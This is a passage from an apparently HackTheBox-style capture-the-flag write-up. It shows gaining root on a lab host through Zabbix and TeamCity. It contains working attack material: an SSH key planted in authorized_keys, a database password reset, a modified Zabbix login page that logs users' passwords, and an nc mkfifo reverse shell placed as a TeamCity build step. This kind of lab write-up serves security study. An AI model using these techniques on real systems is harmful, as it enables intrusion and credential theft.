TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:57110                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-trapper          127.0.0.1:60316                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-trapper          127.0.0.1:45680                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-trapper          127.0.0.1:58666                                                                                                                                                                                                           
ESTAB      0      0               127.0.0.1:58676                   127.0.0.1:zabbix-trapper                                                                                                                                                                                                  
TIME-WAIT  0      0               127.0.0.1:43156                   127.0.0.1:zabbix-trapper                                                                                                                                                                                                  
SYN-SENT   0      1          10.129.234.163:58594             169.254.169.254:http                                                                                                                                                                                                            
ESTAB      0      0               127.0.0.1:mysql                   127.0.0.1:54498                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:38158                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:42162                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:46388                                                                                                                                                                                                           
ESTAB      0      0               127.0.0.1:mysql                   127.0.0.1:54510                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:38108                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-trapper          127.0.0.1:43146                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:42154                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:57092                   127.0.0.1:zabbix-agent                                                                                                                                                                                                    
TIME-WAIT  0      0               127.0.0.1:zabbix-trapper          127.0.0.1:43154                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:38144                                                                                                                                                                                                           
ESTAB      0      0               127.0.0.1:mysql                   127.0.0.1:54476                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:54620                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:46436                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:42134                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:57106                                                                                                                                                                                                           
FIN-WAIT-2 0      0          10.129.234.163:http                   10.10.16.6:58560                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-trapper          127.0.0.1:45670                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-trapper          127.0.0.1:45060                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:35340                   127.0.0.1:zabbix-agent                                                                                                                                                                                                    
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:38100                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-trapper          127.0.0.1:45074                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:42138                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:46410                                                                                                                                                                                                           
ESTAB      0      0               127.0.0.1:mysql                   127.0.0.1:51970                                                                                                                                                                                                           
ESTAB      0      0               127.0.0.1:mysql                   127.0.0.1:45448                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:35354                   127.0.0.1:http                                                                                                                                                                                                            
TIME-WAIT  0      0               127.0.0.1:zabbix-trapper          127.0.0.1:45682                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-trapper          127.0.0.1:53666                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:38136                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:57114                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-trapper          127.0.0.1:54922                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:54640                                                                                                                                                                                                           
ESTAB      0      0          10.129.234.163:http                   10.10.16.6:45976                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:http                    127.0.0.1:55798                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:40848                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-trapper          127.0.0.1:53652                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:46440                                                                                                                                                                                                           
SYN-SENT   0      1          10.129.234.163:51170             169.254.169.254:http                                                                                                                                                                                                            
ESTAB      0      0               127.0.0.1:mysql                   127.0.0.1:37852                                                                                                                                                                                                           
TIME-WAIT  0      0          10.129.234.163:http                   10.10.16.6:59410                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:38160                                                                                                                                                                                                           
FIN-WAIT-2 0      0          10.129.234.163:http                   10.10.16.6:58536                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-trapper          127.0.0.1:60320                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:42176                   127.0.0.1:zabbix-agent                                                                                                                                                                                                    
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:42136                                                                                                                                                                                                           
FIN-WAIT-2 0      0          10.129.234.163:http                   10.10.16.6:53262                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-trapper          127.0.0.1:53632                                                                                                                                                                                                           
LISTEN     0      100    [::ffff:127.0.0.1]:8111                            *:*                                                                                                                                                                                                               
LISTEN     0      1      [::ffff:127.0.0.1]:8105                            *:*                                                                                                                                                                                                               
LISTEN     0      128                  [::]:ssh                          [::]:*                                                                                                                                                                                                               
LISTEN     0      50     [::ffff:127.0.0.1]:9090                            *:*                                                                                                                                                                                                               
LISTEN     0      50     [::ffff:127.0.0.1]:55896                           *:*                                                                                                                                                                                                               
LISTEN     0      50                      *:44005                           *:*                                                                                                                                                                                                               
ESTAB      0      0      [::ffff:127.0.0.1]:8111           [::ffff:127.0.0.1]:48823                                                                                                                                                                                                           
CLOSE-WAIT 1      0      [::ffff:127.0.0.1]:57359          [::ffff:127.0.0.1]:8111                                                                                                                                                                                                            
ESTAB      0      0      [::ffff:127.0.0.1]:45448          [::ffff:127.0.0.1]:mysql                                                                                                                                                                                                           
ESTAB      0      0      [::ffff:127.0.0.1]:54510          [::ffff:127.0.0.1]:mysql                                                                                                                                                                                                           
ESTAB      0      0      [::ffff:127.0.0.1]:54476          [::ffff:127.0.0.1]:mysql                                                                                                                                                                                                           
ESTAB      0      0      [::ffff:127.0.0.1]:54498          [::ffff:127.0.0.1]:mysql                                                                                                                                                                                                           
ESTAB      0      0      [::ffff:127.0.0.1]:37852          [::ffff:127.0.0.1]:mysql                                                                                                                                                                                                           
ESTAB      0      0      [::ffff:127.0.0.1]:48823          [::ffff:127.0.0.1]:8111                                                                                                                                                                                                            
ESTAB      0      0      [::ffff:127.0.0.1]:51970          [::ffff:127.0.0.1]:mysql                                                                                                                                                                                                           

[zabbix_cmd]>>:   

```

### curl check

10050 and 10051 are Zabbix. But 9090, 8111, and 8015 are localhost only and interesting. Checking them out, 8111 is [Team City](https://www.jetbrains.com/teamcity/):

```
[zabbix_cmd]>>:  curl http://127.0.0.1:8111 -v
*   Trying 127.0.0.1:8111...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Connected to 127.0.0.1 (127.0.0.1) port 8111 (#0)
> GET / HTTP/1.1
> Host: 127.0.0.1:8111
> User-Agent: curl/7.81.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 401 
< TeamCity-Node-Id: MAIN_SERVER
< WWW-Authenticate: Basic realm="TeamCity"
< WWW-Authenticate: Bearer realm="TeamCity"
< X-Content-Type-Options: nosniff
< Content-Type: text/plain;charset=UTF-8
< Transfer-Encoding: chunked
< Date: Sat, 28 Mar 2026 06:24:24 GMT
< 
{ [77 bytes data]
100    66    0    66    0     0   9489      0 --:--:-- --:--:-- --:--:-- 13200
* Connection #0 to host 127.0.0.1 left intact
Authentication required
To login manually go to "/login.html" page

```

```
[zabbix_cmd]>>:  curl http://127.0.0.1:8105 -v
*   Trying 127.0.0.1:8105...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Connected to 127.0.0.1 (127.0.0.1) port 8105 (#0)
> GET / HTTP/1.1
> Host: 127.0.0.1:8105
> User-Agent: curl/7.81.0
> Accept: */*
> 
* Recv failure: Connection reset by peer
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
* Closing connection 0
curl: (56) Recv failure: Connection reset by peer
```

```
[zabbix_cmd]>>:  curl http://127.0.0.1:9090 -v
*   Trying 127.0.0.1:9090...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Connected to 127.0.0.1 (127.0.0.1) port 9090 (#0)
> GET / HTTP/1.1
> Host: 127.0.0.1:9090
> User-Agent: curl/7.81.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 400 Bad Request
< Server: Apache XML-RPC 1.0
* no chunk, no close, no size. Assume close to signal end
< 
{ [39 bytes data]
100    39    0    39    0     0   5960      0 --:--:-- --:--:-- --:--:--  7800
* Closing connection 0
Method GET not implemented (try POST)


```

### teamcity

{{< toggle "Tag 🏷️" >}}

{{< tag "Port22-SSH-tunnel" >}} To browser the linux 's local web page, I’ll create an SSH tunnel to access this in my browser. I’ll create a `.ssh` directory in zabbix’s home directory, and add a public key:

{{< /toggle >}}

```
zabbix@watcher:/var/lib/zabbix$ mkdir .ssh
zabbix@watcher:/var/lib/zabbix$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" > .ssh/authorized_keys
zabbix@watcher:/var/lib/zabbix$ chmod 700 .ssh/
zabbix@watcher:/var/lib/zabbix$ chmod 600 .ssh/authorized_keys 
```

Now I can SSH, but the zabbix user’s shell in `passwd` is set to `/nologin`:

```
$ ssh -i ~/keys/ed25519_gen zabbix@watcher.vl
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-1039-aws x86_64)
...[snip]...
This account is currently not available.
Connection to watcher.vl closed.
```

But I can make a tunnel:

```
➜  ssh -i ~/keys/ed25519_gen zabbix@watcher.vl -N -L 8111:localhost:8111
```

This just hangs, but visiting `http://localhost:8111` loads TeamCity:

![Pasted image 20260328145539.png](/ob/Pasted%20image%2020260328145539.png)

The version is 2024.03.3. Not much I can do here without creds.

#### Get Access via Database Manipulation

{{< toggle "Tag 🏷️" >}}

{{< tag "CMS-Teamcity-Access-via-Database-Manipulation" >}} In the control linux machine with owned database to change the TeamCity 's database admin password for login

{{< /toggle >}}

The [Zabbix docs](https://www.zabbix.com/documentation/current/en/manual/web_interface/password_reset) show how to reset the admin password to “zabbix” with a database query:

```
UPDATE users SET passwd = '$2a$10$ZXIvHAEP2ZM.dLXTm6uPHOMVlARXX7cqjbhM6Fn0cANzkCQBWpMrS' WHERE username = 'Admin';
```

I can run this from the shell:

```
mysql> UPDATE users SET passwd = '$2a$10$ZXIvHAEP2ZM.dLXTm6uPHOMVlARXX7cqjbhM6Fn0cANzkCQBWpMrS' WHERE username = 'Admin';
Query OK, 1 row affected (0.01 sec)
Rows matched: 1  Changed: 1  Warnings: 0
```

And then login (making sure to use “Admin” and not “admin”):

[![image-20251004171531179](https://0xdf.gitlab.io/img/image-20251004171531179.png)*Click for full size image*](https://0xdf.gitlab.io/img/image-20251004171531179.png)

#### Audit Logs

On the audit logs, I’ll notice that Frank is logging in. Updating the filters to just show Frank, it shows they are logging in every minute:

[![image-20251004171736833](https://0xdf.gitlab.io/img/image-20251004171736833.png)*Click for full size image*](https://0xdf.gitlab.io/img/image-20251004171736833.png)

### Poison Zabbix Login

Looking at my Burp Proxy HTTP history, the login sends a POST to `/index.php`. I’ll find `index.php` in `/usr/share/zabbix`. The login code looks like it’s around line 70:

```
zabbix@watcher:/usr/share/zabbix$ cat index.php | grep -n login
37:     'autologin' =>  [T_ZBX_INT, O_OPT, null,        null,   null],
57:$autologin = hasRequest('enter') ? getRequest('autologin', 0) : getRequest('autologin', 1);
70:// login via form
71:if (hasRequest('enter') && CWebUser::login(getRequest('name', ZBX_GUEST_USER), getRequest('password', ''))) {
74:     if (CWebUser::$data['autologin'] != $autologin) {
77:                     'autologin' => $autologin
91:echo (new CView('general.login', [
92:     'http_login_url' => (CAuthenticationHelper::get(CAuthenticationHelper::HTTP_AUTH_ENABLED) == ZBX_AUTH_HTTP_ENABLED)
95:     'saml_login_url' => (CAuthenticationHelper::get(CAuthenticationHelper::SAML_AUTH_ENABLED) == ZBX_AUTH_SAML_ENABLED)
98:     'guest_login_url' => CWebUser::isGuestAllowed() ? (new CUrl())->setArgument('enter', ZBX_GUEST_USER) : '',
99:     'autologin' => $autologin == 1,
```

I found the easiest way to modify the file over this reverse shell is to copy all the text and create a file on my host. Now I’ll edit it, adding a few lines:

```
// login via form
if (hasRequest('enter') && CWebUser::login(getRequest('name', ZBX_GUEST_USER), getRequest('password', ''))) {
        $user = $_POST['name'] ?? '??';
        $password = $_POST['password'] ?? '??';
        $f = fopen('/dev/shm/0xdf.txt', 'a+');
        fputs($f, "{$user}:{$password}\n");
        fclose($f);

        CSessionHelper::set('sessionid', CWebUser::$data['sessionid']);
```

Users can login as normal, but their creds will be recorded to `/dev/shm/0xdf.txt`. Now I’ll serve this file with my Python HTTP server, and upload it:

```
zabbix@watcher:/usr/share/zabbix$ cp index.php{,.bak}   
zabbix@watcher:/usr/share/zabbix$ curl 10.10.15.1/index.php -o index.php
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  4692  100  4692    0     0  91465      0 --:--:-- --:--:-- --:--:-- 92000
```

Soon, there’s an `0xdf.txt` in `/dev/shm`:

```
zabbix@watcher:/usr/share/zabbix$ cat /dev/shm/0xdf.txt 
Frank:R%)3S7^Hf4TBobb(gVVs
```

![Pasted image 20260328150345.png](/ob/Pasted%20image%2020260328150345.png)

TeamCity is a CICD build platform, and frank seems to have admin access. I should be able to create a build stage that executes whatever code I want. I’ll click “Create project…”. On the next page, I’ll click “Manually”:

I’ll give it a name:\
![Pasted image 20260328150923.png](/ob/Pasted%20image%2020260328150923.png)

![Pasted image 20260328152141.png](/ob/Pasted%20image%2020260328152141.png)

The next page is general settings, where I’ll click on “Create build configuration”:

![Pasted image 20260328154330.png](/ob/Pasted%20image%2020260328154330.png)

I’ll give it a name, and click “Create”:

![Pasted image 20260328154401.png](/ob/Pasted%20image%2020260328154401.png)

The next page asks for a “New VCS Root”:\
![Pasted image 20260328154443.png](/ob/Pasted%20image%2020260328154443.png)

I’ll click skip, and on the next page, click “Build Steps” from the side menu:\
![Pasted image 20260328154526.png](/ob/Pasted%20image%2020260328154526.png)

This menu has a button to “Add build step”:\
![Pasted image 20260328154829.png](/ob/Pasted%20image%2020260328154829.png)

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.6 1234 >/tmp/f

![Pasted image 20260328155124.png](/ob/Pasted%20image%2020260328155124.png)

On the next menu, I’ll select “Command Line”:

```
➜  CVE-2024-22120-RCE git:(main) ✗ sudo nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.6] from (UNKNOWN) [10.129.234.163] 45114
sh: 0: can't access tty; job control turned off
# whoami 
root
#    
```
